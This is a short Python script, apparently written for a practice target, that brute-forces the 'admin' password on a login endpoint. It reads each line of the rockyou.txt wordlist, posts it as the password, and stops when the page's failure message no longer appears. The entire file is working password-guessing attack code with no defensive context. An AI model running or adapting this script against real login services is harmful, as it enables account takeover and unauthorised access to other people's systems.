import requests
import json

# payload = {'username': 'admin', 'password': 'rockyou.txt'}

f = open("rockyou.txt", "r")  # opens and reads the file
for x in f:
    try:
        payload = {'username': 'admin', 'password': x.strip()}
        url = 'https://spaddex.pw/brute'
        res = requests.post('https://spaddex.pw/brute', data=payload)
        #print(res.text, res.ok, res.url, res.status_code)
        if "Bummer" in res.text:
            print("-> Tried password ", x.strip())
        else:
            print("[+] Found password: ", x.strip())
            break
    except Exception as e:
        pass


